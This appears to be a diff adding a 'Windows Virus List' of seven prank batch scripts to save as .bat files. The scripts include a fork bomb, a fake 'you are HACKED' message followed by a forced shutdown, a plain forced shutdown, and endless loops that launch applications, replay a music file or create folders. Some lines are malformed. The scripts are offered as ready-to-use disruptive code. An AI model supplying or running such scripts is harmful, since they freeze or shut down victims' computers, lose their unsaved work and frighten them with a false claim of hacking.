@@ -1,0 +1,63 @@
+----------------------------------------------------------WINDOWS VIRUS LIST-------------------------------------------------------------
+SAVE ALL FILE'S (".bat" <| ONLY)
+________________________________________________________________________________________________________________________________________
+1:) 					                                          (System Freeze Virus)
+
+%0|%0
+________________________________________________________________________________________________________________________________________
+2:)                                             			     (I LOVE YOU virus)
+
+echo off 
+color 2
+echo Hey , do you love me (Only Answer In Yes/No)
+set /p love=
+if %love%==yes goto love
+if %love%==no goto hate
+:Love
+echo i love you too......
+echo Meet you soon :)
+pause
+exit
+:hate
+echo But i love you.....hehehehehehe
+echo You are HACKED...... 
+echo Your PC will crash in 10 seconds
+timeout10
+shutdown -s -t 10
+________________________________________________________________________________________________________________________________________
+3:)                                                         (Shutdown Virus)
+shutdown -s -t 10 -c "you are hacked"
+________________________________________________________________________________________________________________________________________
+4:)                                                   (Open Many Tab's Virus )
+@echo off
+:x
+start winword
+start mspaint
+start notepad
+start cmd
+start explorer
+start calc
+start control 
+goto x
+____________________________________________________________________________________________________________________________
+5:)                                                    (Open Music Virus )
+echo off 
+:a
+C:\Users\Dell\Downloads\nokia-tune-ringtone.mp3
+goto a
+________________________________________________________________________________________________________________________________________
+6:)                                                 (Open Notepad,Hacked Virus )
+@ECHO OFF
+
+:TOP
+
+START %SYSTEMROOT%\SYSTEM32\hack.EXE
+
+GOTO TOP
+________________________________________________________________________________________________________________________________________
+7:)                                                   (Make a 10.000 Folder Virus )
+@echo off 
+:a
+md %random%
+/folder
+goto :a
